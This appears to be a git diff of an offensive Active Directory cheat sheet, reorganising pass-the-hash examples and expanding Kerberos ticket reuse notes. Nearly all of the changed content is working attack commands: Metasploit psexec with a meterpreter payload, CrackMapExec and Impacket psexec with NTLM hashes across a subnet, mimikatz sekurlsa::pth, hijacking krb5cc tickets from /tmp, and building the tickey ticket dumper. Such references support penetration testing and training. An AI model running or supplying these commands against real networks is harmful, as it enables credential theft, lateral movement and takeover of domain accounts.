@@ -1506,35 +1506,31 @@ Whisker.exe remove /target:computername$ /domain:constoso.local /dc:dc1.contoso.
 
 The types of hashes you can use with Pass-The-Hash are NT or NTLM hashes. Since Windows Vista, attackers have been unable to pass-the-hash to local admin accounts that weren’t the built-in RID 500.
 
-```powershell
-use exploit/windows/smb/psexec
-set RHOST 10.2.0.3
-set SMBUser jarrieta
-set SMBPass nastyCutt3r  
-# NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
-# NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
-set PAYLOAD windows/meterpreter/bind_tcp
-run
-shell
-```
-
-or with crackmapexec
-
-```powershell
-cme smb 10.2.0.2 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
-also works with net range : cme smb 10.2.0.2/24 ... 
-```
-
-or with psexec
-
-```powershell
-proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
-```
-
-or with the builtin Windows RDP and mimikatz
-```powershell
-sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the user's ntlm hash> /run:"mstsc.exe /restrictedadmin"
-```
+* Metasploit
+  ```powershell
+  use exploit/windows/smb/psexec
+  set RHOST 10.2.0.3
+  set SMBUser jarrieta
+  set SMBPass nastyCutt3r  
+  # NOTE1: The password can be replaced by a hash to execute a `pass the hash` attack.
+  # NOTE2: Require the full NTLM hash, you may need to add the "blank" LM (aad3b435b51404eeaad3b435b51404ee)
+  set PAYLOAD windows/meterpreter/bind_tcp
+  run
+  shell
+  ```
+* CrackMapExec
+  ```powershell
+  cme smb 10.2.0.2/24 -u jarrieta -H 'aad3b435b51404eeaad3b435b51404ee:489a04c09a5debbc9b975356693e179d' -x "whoami"
+  ```
+* Impacket suite
+  ```powershell
+  proxychains python ./psexec.py jarrieta@10.2.0.2 -hashes :489a04c09a5debbc9b975356693e179d
+  ```
+* Windows RDP and mimikatz
+  ```powershell
+  sekurlsa::pth /user:Administrator /domain:contoso.local /ntlm:b73fdfe10e87b4ca5c0d957f81de6863
+  sekurlsa::pth /user:<user name> /domain:<domain name> /ntlm:<the users ntlm hash> /run:"mstsc.exe /restrictedadmin"
+  ```
 
 You can extract the local **SAM database** to find the local administrator hash :
 
@@ -2625,15 +2621,30 @@ Navigate to any web application that is integrated with our AAD domain. Once at 
 
 ### CCACHE ticket reuse from /tmp
 
-List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`
-
 > When tickets are set to be stored as a file on disk, the standard format and type is a CCACHE file. This is a simple binary file format to store Kerberos credentials. These files are typically stored in /tmp and scoped with 600 permissions
+
+List the current ticket used for authentication with `env | grep KRB5CCNAME`. The format is portable and the ticket can be reused by setting the environment variable with `export KRB5CCNAME=/tmp/ticket.ccache`. Kerberos ticket name format is `krb5cc_%{uid}` where uid is the user UID. 
+
+```powershell
+$ ls /tmp/ | grep krb5cc
+krb5cc_1000
+krb5cc_1569901113
+krb5cc_1569901115
+
+$ export KRB5CCNAME=/tmp/krb5cc_1569901115
+```
+
 
 ### CCACHE ticket reuse from keyring
 
 Tool to extract Kerberos tickets from Linux kernel keys : https://github.com/TarlogicSecurity/tickey
 
 ```powershell
+# Configuration and build
+git clone https://github.com/TarlogicSecurity/tickey
+cd tickey/tickey
+make CONF=Release
+
 [root@Lab-LSV01 /]# /tmp/tickey -i
 [*] krb5 ccache_name = KEYRING:session:sess_%{uid}
 [+] root detected, so... DUMP ALL THE TICKETS!!
@@ -2795,3 +2806,4 @@ CME          10.XXX.XXX.XXX:445 HOSTNAME-01   [+] DOMAIN\COMPUTER$ 31d6cfe0d16ae
 * [AD CS relay attack - practical guide - 23 Jun 2021 - @exandroiddev](https://www.exandroid.dev/2021/06/23/ad-cs-relay-attack-practical-guide/)
 * [Shadow Credentials: Abusing Key Trust Account Mapping for Account Takeover - Elad Shamir - Jun 17](https://posts.specterops.io/shadow-credentials-abusing-key-trust-account-mapping-for-takeover-8ee1a53566ab#Previous%20Work)
 * [Playing with PrintNightmare - 0xdf - Jul 8, 2021](https://0xdf.gitlab.io/2021/07/08/playing-with-printnightmare.html)
+* [Attacking Active Directory: 0 to 0.9 - Eloy Pérez González - 2021/05/29](https://zer1t0.gitlab.io/posts/attacking_ad/)
